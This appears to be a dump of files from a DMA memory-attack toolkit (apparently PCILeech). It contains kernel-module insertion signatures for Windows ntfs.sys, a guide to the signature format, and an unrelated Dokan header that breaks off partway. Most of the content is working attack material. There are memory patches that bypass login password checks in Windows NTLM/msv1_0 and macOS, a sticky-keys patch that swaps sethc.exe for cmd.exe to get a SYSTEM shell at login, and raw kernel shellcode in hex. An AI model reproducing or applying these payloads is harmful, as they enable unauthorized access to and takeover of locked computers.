ntfs.sys signed on 2014-10-15 (Windows 8.1 x64);win8x64_ntfs_20141015.kmd;# ntfs.sys signed on 2014-10-15 (MJ_CREATE);0xd3000;0x4a000;1ac5c0df47e153480fc49bb3687df84473168bd65b4bb58ab3885f47a6116d1b;a65cf907fb5aecb5d2a256b8a49706469025c740a896e3a8d0b27537f6fbbc6f;,d3920,DEFAULT_WINX64_STAGE1,4ad80,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804a000100210001800a0003800c00018054010100080000001b00018001000000
ntfs.sys signed on 2015-12-30 (Windows 8.1 x64);win8x64_ntfs_20151230.kmd;# ntfs.sys signed on 2016-12-30 (MJ_CREATE);0xd1000;0x49000;65b0b0cf8a508d20cb6906fe4fea9e10a1c4398c4f5c4bbbc366383e06572695;6387547a0a12d5814681f0ed5fc47cd6aa31e8b4428bee8cf18081bb8ab57d67;,d1190,DEFAULT_WINX64_STAGE1,49d80,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038049000100200001800a0003800c00018054010100080000001b00018001000000
ntfs.sys signed on 2017-09-09 (Windows 8.1 x64);win8x64_ntfs_20170909.kmd;# ntfs.sys signed on 2017-09-09 (MJ_CREATE);0xd0000;0x49000;a8857d9011802d52075b70854b2f7b83fc05b66e12bf212fbaee97779958afd8;3121c422abd92bba47dba5f660bc72e94b3ee5703857763b1b6498730499bc52;,d0c80,DEFAULT_WINX64_STAGE1,49d80,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038049000100210001800a0003800c00018052010100080000001b00018001000000
ntfs.sys signed on 2016-02-23 (Windows 10 x64);win10x64_ntfs_20160223.kmd;# ntfs.sys signed on 2016-02-23 (MJ_CREATE);0xca000;0x4f000;0592b0387ec943697dd0f552564e087c8dd385b25db565ffb11fa6bd1cf10b14;218325e192e8146883054359e984376be0d13486c05d31ab4a23ff834ebb623e;,ca770,DEFAULT_WINX64_STAGE1,4fe38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804f00010023000180080003801400018066010100050000001d00018001000000
ntfs.sys signed on 2015-12-01 (Windows 10 x64);win10x64_ntfs_20151201.kmd;# ntfs.sys signed on 2015-12-01 (MJ_CREATE);0xc5000;0x4d000;3bac25cd0e0cfc45dcb7efa67200e4800ffe8278fd3249a382bd4403f3309756;fcc23d38f37141010e2985cc2c7babc8796c36e85b820d77d5c6b4fe66c6caf0;,c51e0,DEFAULT_WINX64_STAGE1,4dd30,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804d00010022000180080003801400018061010100050000001d00018001000000
ntfs.sys signed on 2015-07-30 (Windows 10 x64);win10x64_ntfs_20150730.kmd;# ntfs.sys signed on 2015-07-30 (MJ_CREATE);0xc4000;0x4d000;cd135fc58b88f96abff0ddb1207cb9e84e5b2f040607d0500de0018d32ad1572;2cfd3b597b341c056a30a186b1347d82d211cf1319464ad1f13cfa525891e409;,c4dc0,DEFAULT_WINX64_STAGE1,4dd20,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804d00010022000180080003801400018061010100050000001d00018001000000
ntfs.sys signed on 2015-07-17 (Windows 10 x64);win10x64_ntfs_20150717.kmd;# ntfs.sys signed on 2015-07-17 (MJ_CREATE);0x1f000;0x4d000;9ac57fa7e7d8d92e066c6ce9c76c82fc3afccc1e6211eb4d9b03ea79c8a70b3b;2cfd3b597b341c056a30a186b1347d82d211cf1319464ad1f13cfa525891e409;,1fb90,DEFAULT_WINX64_STAGE1,4dd20,DEFAULT_WINX64_STAGE2.bin,0,DEFAULT_WINX64_STAGE3,0,010003804d00010022000180080003801400018061010100050000001d00018001000000
ntfs.sys signed on 2015-07-10 (Windows 10 x64);win10x64_ntfs_20150710.kmd;# ntfs.sys signed on 2015-07-10 (MJ_CREATE);0xc4000;0x4d000;a8a4e0d7963c2652226064c674b7ed38b1f84a8661e8f63663783dafb83271fc;95964341fb3121baf303037a3796bd98c4167261ead9a4b4587a31e8a546dda1;,c4ec0,DEFAULT_WINX64_STAGE1,4dd20,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804d00010022000180080003801400018062010100050000001d000180
ntfs.sys signed on 2016-03-29 (Windows 10 x64);win10x64_ntfs_20160329.kmd;# ntfs.sys signed on 2016-03-29 (MJ_CREATE);0xca000;0x4f000;d091d4d5452ef388c6ff22780922f3f944a8439e5109dae207151f7f4fd23991;84b0ffd20272e8757023975ef52132c9e82df7e81da537cf436407733a1f4957;,ca770,DEFAULT_WINX64_STAGE1,4fe38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804f00010023000180080003801400018066010100050000001d000180
ntfs.sys signed on 2016-08-03 (Windows 10 x64) [10.0.10240.17071];win10x64_ntfs_20160803_10240.kmd;# ntfs.sys signed on 2016-08-03 (MJ_CREATE) [10.0.10240.17071];0xc5000;0x4d000;c80d2ff8c58669a539ecc636103a73eb8c65a4568c81d6627a9b14f428d0207f;bafe68ca0561d5137504c53360cdec01b8d522eade7e558b90231fdaf53a66a5;,c51e0,DEFAULT_WINX64_STAGE1,4de38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804d00010022000180080003801400018061010100050000001d00018001000000
ntfs.sys signed on 2017-09-19 (Windows 10 x64) [10.0.10240.17643];win10x64_ntfs_20170919_10240.kmd;# ntfs.sys signed on 2017-09-19 (MJ_CREATE) [10.0.10240.17643];0xdd000;0x1ec000;3f688bfd33764abc387ed1ffe57ee287cb4726ef58fb88f104a350d62f25b240;950b63465d1982cc41108376717f8dda508c3778b6358ce21e4272c7e75a1306;,dd7b0,DEFAULT_WINX64_STAGE1,1ece38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003804d00010022000180080003801400018061010100050000001d00018001000000
ntfs.sys signed on 2016-07-16 (Windows 10 x64) [10.0.14393.0];win10x64_ntfs_20160716_14393.kmd;# ntfs.sys signed on 2016-07-16 (MJ_CREATE) [10.0.14393.0];0xf6000;0x53000;5cadebe69115cc66e07f7d1e3f97ad0522840c1c648d33b37d8fe9f9a36ae413;04d501dae7a097b649edc0bb68dc02036e31ece8c30ee48ab24ac8fb3095fe46;,f6b70,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2016-08-20 (Windows 10 x64) [10.0.14393.103];win10x64_ntfs_20160820_14393.kmd;# ntfs.sys signed on 2016-08-20 (MJ_CREATE) [10.0.14393.103];0xf6000;0x53000;c6b3a2c6a9d19798b9974704e551a4798d0f2098279a67924eebcb03cee07590;04d501dae7a097b649edc0bb68dc02036e31ece8c30ee48ab24ac8fb3095fe46;,f6b70,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2016-09-07 (Windows 10 x64) [10.0.14393.187];win10x64_ntfs_20160907_14393.kmd;# ntfs.sys signed on 2016-09-07 (MJ_CREATE) [10.0.14393.187];0xf7000;0x53000;e6f94244f8ab0cb45a2509679a15ebbb933c936c23d0c600116124b4aebf67d5;04d501dae7a097b649edc0bb68dc02036e31ece8c30ee48ab24ac8fb3095fe46;,f78e0,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2016-11-02 (Windows 10 x64) [10.0.14393.447];win10x64_ntfs_20161102_14393.kmd;# ntfs.sys signed on 2016-11-02 (MJ_CREATE) [10.0.14393.447];0xf7000;0x53000;e044cff9460a778a04e75081dbfa7441bd1b142a9798a2c978c28612f33682c3;04d501dae7a097b649edc0bb68dc02036e31ece8c30ee48ab24ac8fb3095fe46;,f78e0,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2017-03-04 (Windows 10 x64) [10.0.14393.953];win10x64_ntfs_20170304_14393.kmd;# ntfs.sys signed on 2017-03-04 (MJ_CREATE) [10.0.14393.953];0xf7000;0x53000;228a30faacc59dd6b41fab0a5eab73e30ee774fde51e4ee30a8501f81cfe8e54;6c4742133e9409255abb3c3d21eca24e7f303b4968e703acfe4f3e3f4e39ce36;,f78f0,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2017-04-28 (Windows 10 x64) [10.0.14393.1198];win10x64_ntfs_20170428_14393.kmd;# ntfs.sys signed on 2017-04-28 (MJ_CREATE) [10.0.14393.1198];0xf7000;0x53000;1546b88e89466c8602690714ca39ddfde499a3f33a5869747530cb060daf8923;0a9519910b85e243dde74efa9e9f205e182ef166048bd0fe29ff0618df10ba3d;,f78f0,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2017-09-18 (Windows 10 x64) [10.0.14393.1770];win10x64_ntfs_20170918_14393.kmd;# ntfs.sys signed on 2017-09-18 (MJ_CREATE) [10.0.14393.1770];0xf7000;0x53000;d1cf002a0c0db5927ae3e0bacdb1f52fb283416e23e1d42387bae39a3f384cb3;2138340b1aabd7f419293f82683c6dde30937214f29b3d83791c13be00da50db;,f7a10,DEFAULT_WINX64_STAGE1,53e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,0100038053000100240001800800038014000180760101000500000022000180
ntfs.sys signed on 2017-03-18 (Windows 10 x64) [10.0.15063.0];win10x64_ntfs_20170318_15063.kmd;# ntfs.sys signed on 2017-03-18 (MJ_CREATE) [10.0.15063.0];0xcb000;0x55000;f190019c227cbbbd19e9ed6fb840e9838afab598b9ac23a3008d60fb3b139845;b48ce1f64615ae1e734d36f94c0c41cce4e5f6caab58df0121ca6f27e8569599;,cb2e0,DEFAULT_WINX64_STAGE1,55e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,01000380550001002800018008000380150001807f0101000500000023000180
ntfs.sys signed on 2017-09-30 (Windows 10 x64) [10.0.15063.674];win10x64_ntfs_20170930_15063.kmd;# ntfs.sys signed on 2017-09-30 (MJ_CREATE) [10.0.15063.674];0xcb000;0x219000;c1627584ba74d093e74760e12d5c74e0549d5d768f4ec462d55eedfe8dd74d98;871a6f00aea79f7bfd79d23cd3d72d9ae0f7cf7b344ac5f5e9511a641c202348;,cb390,DEFAULT_WINX64_STAGE1,219e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,01000380550001002800018008000380150001807f0101000500000023000180
ntfs.sys signed on 2017-11-02 (Windows 10 x64) [10.0.15063.726];win10x64_ntfs_20171102_15063.kmd;# ntfs.sys signed on 2017-11-02 (MJ_CREATE) [10.0.15063.726];0xcb000;0x219000;b67b714d8ba13a16ef64df94347b2ce373b2447c59a7a723579d1391b1c8c160;1de51f66634410d684aa5764646472e7bd51c3e380308d7418400665168d2c09;,cb3a0,DEFAULT_WINX64_STAGE1,219e38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,01000380550001002800018008000380150001807f0101000500000023000180
ntfs.sys signed on 2017-10-10 (Windows 10 x64) [10.0.16299.19];win10x64_ntfs_20171010_16299.kmd;# ntfs.sys signed on 2017-10-10 (MJ_CREATE) [10.0.16299.19];0xf6000;0x22c000;55b6529027827c433303454a3bfd0fc540bfcb7163089bb4650fb578999db299;8bdfd5302c2521f1a723ef61bdc2543f52bd9a6748d6bb2788ab4ff8ed87dd6f;,f6120,DEFAULT_WINX64_STAGE1,22ce38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,010003805a0001002900018008000380150001808c0101000500000023000180
ntfs.sys signed on 2018-02-10 (Windows 10 x64) [10.0.16299.248];win10x64_ntfs_20180210_16299.kmd;# ntfs.sys signed on 2018-02-10 (MJ_CREATE) [10.0.16299.248];0xd5000;0x22a000;f7d9b1cb758ad97d9070fdfefcc09fe53ba6d42a5fe2d9074a3aa97f7ef95ddf;61c552bc451be0d577fc9828ab6ebed62dc117f17265a5f8c42013f1d843285e;,d5640,DEFAULT_WINX64_STAGE1,22ae38,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3,0,01000380590001002900018008000380150001808b0101000500000023000180

```

`files/signature_info.txt`:

```txt
Signature Guide for Search/Patch signatures and Kernel Module signatures
========================================================================



GENERAL
=======
Signature files are read line by line.     Signature files may contain multiple
signature lines.  The exception is kernel module inserts by page table hijack -
which may only contain one line.    Each line contains either a comment, starts
with '#', or a signature line.  Signature lines are comma separated and divided
into 'chunks'. Each chunk contains an 'offset' and a 'data' section. The offset
is a hexadecimal dword. The data section is binary data which can be either of:
- = no data.
DEFAULT_ = data loaded from builtin pre-defined shellcodes.
ASCIIHEX = data as asciihex.
FILENAME = file name to load binary data from.

EXAMPLE:
B60,FF15C207,0,-,1aab00,file.bin
The example contains three chunks. 
chunk[0] = offset B60 and data FF15C207.
chunk[1] = offset 0 and no data.
chunk[2] = offset 1aab00 and data loaded from file.



MEMORY PATCH SIGNATURE FORMAT
=============================
A memory patch signature file have the extension '.sig'.     A file may contain
multiple memory patch signatures.     A memory patch signature consists exactly
three (3) chunks. Memory patch signatures support wildcard and relative offsets
in addition to the standard in-page offset.
chunk[0] = search pattern 'data' at 'offset' distance from page base.
chunk[1] = search pattern 'data' at 'offset' distance from page base.
           only searched in same page as chunk[0] if match is made in chunk[0].
           optional. if not used specify data: '-'
chunk[2] = replace contents with 'data' at distance 'offset' from page base.

MEMORY PATCH SIGNATURES - WILDCARD AND RELATIVE OFFSETS
=======================================================
- Memory patch signatures support in-page fixed offsets in all signature chunks
  Examples: 0 ; e0 ; ee0.
- Wildcard offsets are supported in signature chunk 0 and 1, but not in chunk 2
  which is chunk containing patch data. A wildcard offset is denoted by '*'.
  Example: *
- Relative offsets are supported only in signature chunk 1 and 2.  The relative
  offset is not supported in signature chunk 0. Relative offsets are calculated
  from the offset in chunk 0.  Relative offsets can be combined with a wildcard
  offset in chunk 0.   A relative offset is given by r and then the offset as a
  32-bit DWORD in hex.
  Examples: r0 ; r1F0 ; rFFFFFFF0 (negative offset of 0x10)



KERNEL MODULE SIGNATURE FORMAT #1 - memory search
=================================================
The default format for kernel signatures is the memory search format.   This is
used by PCILeech to search the memory for a signature, which is then patched.
Note that only fixed in-page offsets are supported in kernel module signatures.
chunk[0] = search pattern 'data' at 'offset' distance from page base. 
           This page contains the function to be overwritten by stage #1 code.
chunk[1] = search pattern 'data' at 'offset' distance from page base.
           Stage #2 code will be placed in this page.
chunk[2] = offset to where to place stage #1 code, and stage #1 code.
chunk[3] = offset to where to place stage #2 code, and stage #2 code.
chunk[4] = <offset not in use>, and stage #3 code.



KERNEL MODULE SIGNATURE FORMAT #2 - page table hijack
=====================================================
The page table hijack format is used when a page table needs to be hijacked in
order to gain execution (if the targeted executable memory is above 4GB). Note
that only fixed in-page offsets are supported in kernel module signatures.
chunk[0] = <offset not in use>, 4096-bytes of original page bytes for page in
           which stage #1 code should be placed.           
chunk[1] = <offset not in use>, 4096-bytes of original page bytes for page in
           which stage #2 code should be placed.
chunk[2] = offset to where to place stage #1 code, and stage #1 code.
chunk[3] = offset to where to place stage #2 code, and stage #2 code.
chunk[4] = <offset not in use>, and stage #3 code.
chunk[5] = <offset not in use>, "driver signature"
```

`files/stickykeys_cmd_win.sig`:

```sig
# replace sethc.exe with cmd.exe in memory on Windows
# Signatur for PCILeech version 1.1
# syntax: see signature_info.txt for more information.
#
# Signature by Ian Vitek (Sigtrap)
#
# Signature only found after activating sticky keys at least once.
# (Not 100% reliable to find the signature in memory, but fiddeling around
#  with sticky keys will in the end leave the sethc.exe in memory.)
# So, press SHIFT five times to start sethc.exe then patch with this signature.
# Close the Sticky Key dialog and press SHIFT five times
#  to get cmd.exe with system access at login.
#
# Windows x64 all versions [20160906]
*,00730065007400680063002E00650078006500200025006C006400000000000000730065007400680063002E006500780065,0,-,r0,0063006D0064002E0065007800650020002000200025006C00640000000000000063006D0064002E00650078006500200020

```

`files/unlock_macos.sig`:

```sig
# unlock signatures for macOS
# syntax: see signature_info.txt for more information.
#
#
# CFOpenDirectory!ODRecordVerifyPassword (various versions)
*,080000004C89F7E83EC40000EB0231DB88D84883C4685B415C415D415E415F5D,0,-,r10,b001
*,080000004C89F7E81AC40000EB0231DB88D84883C4685B415C415D415E415F5D,0,-,r10,b001

```

`files/unlock_win10x64.sig`:

```sig
# unlock signature for Windows 10 x64 version
# syntax: see signature_info.txt for more information.
#
#
# signature for Windows 10 x64 [NtlmShared.dll (2015-07-10)/10.0.10240.16384]
5DF,FF154B1C,5E8,0F8518FB,5E8,909090909090
#
# signature for Windows 10 x64 [NtlmShared.dll (2015-10-30)/10.0.10586.0]
62F,FF15B31B,638,0F8518FB,638,909090909090
#
# signature for Windows 10 x64 [NtlmShared.dll (2016-07-16)/10.0.14393.0]
6dF,FF15D31B,6e8,0F8518FB,6e8,909090909090
# signature for Windows 10 x64 [NtlmShared.dll (2019-02-06)/10.0.14393.2791]
6F5,493BC60F8518FBFFFFB801,6F5,493BC60F8518FBFFFFB801,6F9,84
#
# signature for Windows 10 x64 [NtlmShared.dll (2017-03-18)/10.0.15063.0]
615,FF15C51C,61e,0F852EFB,61e,909090909090
# signature for Windows 10 x64 [NtlmShared.dll (2019-09-30)/10.0.15063.2106]
625,FF15B51C,62e,0F852EFB,62e,909090909090
#
# signature for Windows 10 x64 [NtlmShared.dll (2017-09-29)/10.0.16299.15]
615,FF15D51C,61e,0F852EFB,61e,909090909090
#
# signature for Windows 10 x64 [NtlmShared.dll (2018-04-11)/10.0.17134.1]
695,FF15551C,69e,0F852EFB,69e,909090909090
# signature for Windows 10 x64 [NtlmShared.dll (2019-10-02)/10.0.17134.1067]
6AB,493BC60F852EFBFFFFB001,6AB,493BC60F852EFBFFFFB001,6AF,84
#
# signature for Windows 10 x64 [NtlmShared.dll (2018-09-15)/10.0.17763.1]
740,FF15B21B,749,0F840BFBFFFF,749,0F85
#
# signature for Windows 10 x64 [NtlmShared.dll (2019-03-19)/10.0.18362.1]
# signature for Windows 10 x64 [NtlmShared.dll (2019-10-06)/10.0.18362.418]
741,32C0E904FBFFFF,741,32C0E904FBFFFF,741,B001E904FBFFFF
#
# signature for Windows 10 x64 [NtlmShared.dll (2019-12-07)/10.0.19041.1]
426,48FF155320,435,0F84BAFAFFFF,435,0F85
```

`files/unlock_win8x64.sig`:

```sig
# unlock signatures for Windows 8.1
# syntax: see signature_info.txt for more information.
#
#
# signature for Windows 8.1 x64 [msv1_0.dll (signed on: 2014-10-29)]
EE0,FF1542A4,EE9,0F854688,EE9,909090909090
#
# signature for Windows 8.1 x64 [msv1_0.dll (signed on: 2015-10-30)]
B60,FF15C207,B69,0F85CEBC,B69,909090909090
#
# signature for Windows 8.1 x64 [msv1_0.dll (signed on: 2016-03-16)]
F00,FF152204,F09,0F85B2B9,F09,909090909090
```

`files/unlock_winvistax64.sig`:

```sig
# unlock signatures for Windows Vista x64 version
# syntax: see signature_info.txt for more information.
#
#
# signature for Windows Vista x64 [msv1_0.dll 6.0.6002.18005]
1a1,c60f85,1a8,b8,1a2,909090909090
#
# signature for Windows Vista x64 [msv1_0.dll 6.0.6002.19431]
d89,c60f85,d90,b8,d8a,909090909090
```

`files/win7x64.kmd`:

```kmd
# signatures for Windows 7 x64 version
#
#
# ntfs.sys signed on 2010-11-20 14:33:45 (MJ_CREATE) | (WIN7SP1-INSTALL)
7F0,488954241048894C240853565741544155415641574881EC70010000488BF248,000,C14133C24103C7468D84084F7EA86F418BC2F7D041C1C0064403C1410BC033C1,A87F0,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys signed on 2013-04-12 16:16:03 (MJ_CREATE)
680,488954241048894C240853565741544155415641574881EC70010000488BF248,940,48895C2408574883EC708B118B4104488BF9895158C1EA0389415C83E23F41B8,AA680,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys signed on 2014-01-24 04:37:56 (MJ_CREATE)
990,488954241048894C240853565741544155415641574881EC70010000488BF248,000,C14133C04133C20344240C448D8C106556ACC48BC1F7D041C1C1174503C8410B,A7990,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys signed on 2016-01-08 20:19:54 (MJ_CREATE)
BD0,488954241048894C240853565741544155415641574881EC70010000488BF248,000,C14133C24103C4428D940053144402C1C20903D18BC233C14123C233C103C346,A7BD0,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys signed on 2016-01-11 20:10:19 (MJ_CREATE)
AA0,488954241048894C240853565741544155415641574881EC70010000488BF248,000,468D8408F87CA21F8BC141C1C0104403C14133C04133C20344240C448D8C1065,A7AA0,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys [6.1.7601.23839] signed on 2017-07-09 16:32:49 (MJ_CREATE/NtfsFsdCreate)
380,488954241048894C240853565741544155415641574881EC70010000488BF248,000,03D14123C24133C04103C48D8C10B15BFFFF8B532C8B5B3CC1C1118954240841,A7380,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys [6.1.7601.23932] signed on 2017-10-17 00:07:00 (MJ_CREATE/NtfsFsdCreate)
3D0,488954241048894C240853565741544155415641574881EC70010000488BF248,000,FFFF8B532C8B5B3CC1C11189542408418BC24133C14103CA23C14133C103C246,A73D0,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
#
#
# ntfs.sys [6.1.7601.24000] signed on 2018-08-08 03:20:35 (MJ_CREATE/NtfsFsdCreate)
# ntfs.sys [6.1.7601.24335] signed on 2018-12-28 21:02:08 (MJ_CREATE/NtfsFsdCreate)
390,488954241048894C240853565741544155415641574881EC70010000488BF248,000,11906B8BC14133C3C1C2074103D323C233C14103C5468D8410937198FD418BC3,A7390,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3
# ntfs.sys [6.1.7601.24382] signed on 2019-02-10 18:10:39 (MJ_CREATE/NtfsFsdCreate)
370,488954241048894C240853565741544155415641574881EC70010000488BF248,000,8bc24133c14103ca23c14133c103c2468d9c00bed75c89418bc233c141c1c316,A7370,DEFAULT_WINX64_STAGE1,44E00,DEFAULT_WINX64_STAGE2,0,DEFAULT_WINX64_STAGE3

```

`files/winvistax64.kmd`:

```kmd
# unlock signatures for Windows Vista x64 version
# syntax: see signature_info.txt for more information.
#
# NB! stage2 code differs slightly from other winx64 code (extra stack alignment around MmGetPhysicalAddress to avoid bluescreen)
#
# signature for Windows Vista x64 SP2 [ntfs.sys (signed on: 2009-04-11)]
2df,0f82b0b7,0ec,80e85efd,ae290,DEFAULT_WINX64_STAGE1,45d00,eb12000000000000000000000000000000000000584883e805505152415041510f20c15181e1fffffeff0f22c1488b15d4ffffff488910b000b201488d0dc0fffffff00fb0117522415441554883ec200f010c24488b4c2402488b4904e8b40000004883c420415d415c580f22c0415941585a59c35657488bf14833ff4833c0fcac84c07407c1cf0d03f8ebf48bc75f5ec348c1e90c48c1e10cb800100000482bc8668b01663d4d5a75ef8b413c3d0010000077e54803c18b003d5045000075d9488bc1c357568b793c8bbc39880000004803f9448b47184833f68b47204803c18b04b04803c151488bc8e885ffffff593bc2740548ffc6ebe18b57244803d14833c0668b04728b571c4803d18b04824803c15e5fc3e877ffffff4c8be0498bccbabc1e369fe89affffff48c7c10020000048c7c2ffffff7fffd04c8be84833c0b900040000ffc9498944cd0075f74d89650848b8488d05f1ffffff484989850010000048b88b004883f80074f0498985081000004155b8001000004903c5506a004883ec20498bccba026ba094e832ffffff498bcd48c7c2ffff1f004d33c04d33c9ffd04883c438498bccba5763325ae80fffffffc8200000498bcdffd0c989053efeffffc3,0,DEFAULT_WINX64_STAGE3
#
# signature for Windows Vista x64 SP2 [ntfs.sys (signed on: 2013-03-03)]
25f,0f82b0b5,08c,80e85efd,ae210,DEFAULT_WINX64_STAGE1,45d00,eb12000000000000000000000000000000000000584883e805505152415041510f20c15181e1fffffeff0f22c1488b15d4ffffff488910b000b201488d0dc0fffffff00fb0117522415441554883ec200f010c24488b4c2402488b4904e8b40000004883c420415d415c580f22c0415941585a59c35657488bf14833ff4833c0fcac84c07407c1cf0d03f8ebf48bc75f5ec348c1e90c48c1e10cb800100000482bc8668b01663d4d5a75ef8b413c3d0010000077e54803c18b003d5045000075d9488bc1c357568b793c8bbc39880000004803f9448b47184833f68b47204803c18b04b04803c151488bc8e885ffffff593bc2740548ffc6ebe18b57244803d14833c0668b04728b571c4803d18b04824803c15e5fc3e877ffffff4c8be0498bccbabc1e369fe89affffff48c7c10020000048c7c2ffffff7fffd04c8be84833c0b900040000ffc9498944cd0075f74d89650848b8488d05f1ffffff484989850010000048b88b004883f80074f0498985081000004155b8001000004903c5506a004883ec20498bccba026ba094e832ffffff498bcd48c7c2ffff1f004d33c04d33c9ffd04883c438498bccba5763325ae80fffffffc8200000498bcdffd0c989053efeffffc3,0,DEFAULT_WINX64_STAGE3
```

`includes/dokan.h`:

```h
/*
  Dokan : user-mode file system library for Windows

  Copyright (C) 2015 - 2019 Adrien J. <liryna.stark@gmail.com> and Maxime C. <maxime@islog.com>
  Copyright (C) 2020 Google, Inc.
  Copyright (C) 2007 - 2011 Hiroki Asakawa <info@dokan-dev.net>

  http://dokan-dev.github.io

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU Lesser General Public License as published by the Free
Software Foundation; either version 3 of the License, or (at your option) any
later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU Lesser General Public License along
with this program. If not, see <http://www.gnu.org/licenses/>.
*/

#ifndef DOKAN_H_
#define DOKAN_H_

/** Do not include NTSTATUS. Fix  duplicate preprocessor definitions */
#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntstatus.h>

#include "fileinfo.h"
#include "public.h"

#ifdef _EXPORTING
/** Export dokan API see also dokan.def for export */
#define DOKANAPI __stdcall
#else
/** Import dokan API */
#define DOKANAPI __declspec(dllimport) __stdcall
#endif

/** Change calling convention to standard call */
#define DOKAN_CALLBACK __stdcall

#ifdef __cplusplus
extern "C" {
#endif

/** @file */

/**
 * \defgroup Dokan Dokan
 * \brief Dokan Library const and methods
 */
/** @{ */

/** The current Dokan version (200 means ver 2.0.0). \ref DOKAN_OPTIONS.Version */
#define DOKAN_VERSION 200
/** Minimum Dokan version (ver 2.0.0) accepted. */
#define DOKAN_MINIMUM_COMPATIBLE_VERSION 200
/** Driver file name including the DOKAN_MAJOR_API_VERSION */
#define DOKAN_DRIVER_NAME L"dokan" DOKAN_MAJOR_API_VERSION L".sys"
/** Network provider name including the DOKAN_MAJOR_API_VERSION */
#define DOKAN_NP_NAME L"Dokan" DOKAN_MAJOR_API_VERSION

/** @} */

/**
 * \defgroup DOKAN_OPTION DOKAN_OPTION
 * \brief All DOKAN_OPTION flags used in DOKAN_OPTIONS.Options
 * \see DOKAN_FILE_INFO
 */
/** @{ */

/** Enable ouput debug message */
#define DOKAN_OPTION_DEBUG 1
/** Enable ouput debug message to stderr */
#define DOKAN_OPTION_STDERR (1 << 1)
/**
 * Enable the use of alternate stream paths in the form
 * <file-name>:<stream-name>. If this is not specified then the driver will
 * fail any attempt to access a path with a colon.
 */
#define DOKAN_OPTION_ALT_STREAM (1 << 2)
/** Enable mount drive as write-protected */
#define DOKAN_OPTION_WRITE_PROTECT (1 << 3)
/** Use network drive - Dokan network provider needs to be installed */
#define DOKAN_OPTION_NETWORK (1 << 4)
/**
 * Use removable drive
 * Be aware that on some environments, the userland application will be denied
 * to communicate with the drive which will result in a unwanted unmount.
 * \see <a href="https://github.com/dokan-dev/dokany/issues/843">Issue #843</a>
 */
#define DOKAN_OPTION_REMOVABLE (1 << 5)
/**
 * Use Windows Mount Manager.
 * This option is highly recommended to use for better system integration
 *
 * If a drive letter is used but is busy, Mount manager will assign one for us and 
 * \ref DOKAN_OPERATIONS.Mounted parameters will contain the new mount point.
 */
#define DOKAN_OPTION_MOUNT_MANAGER (1 << 6)
/** Mount the drive on current session only */
#define DOKAN_OPTION_CURRENT_SESSION (1 << 7)
/** Enable Lockfile/Unlockfile operations. Otherwise Dokan will take care of it */
#define DOKAN_OPTION_FILELOCK_USER_MODE (1 << 8)
/**
 * Enable Case sensitive path.
 * By default all path are case insensitive.
 * For case sensitive: \dir\File & \diR\file are different files
 * but for case insensitive they are the same.
 */
#define DOKAN_OPTION_CASE_SENSITIVE (1 << 9)
/** Allows unmounting of network drive via explorer */
#define DOKAN_OPTION_ENABLE_UNMOUNT_NETWORK_DRIVE (1 << 10)
/**
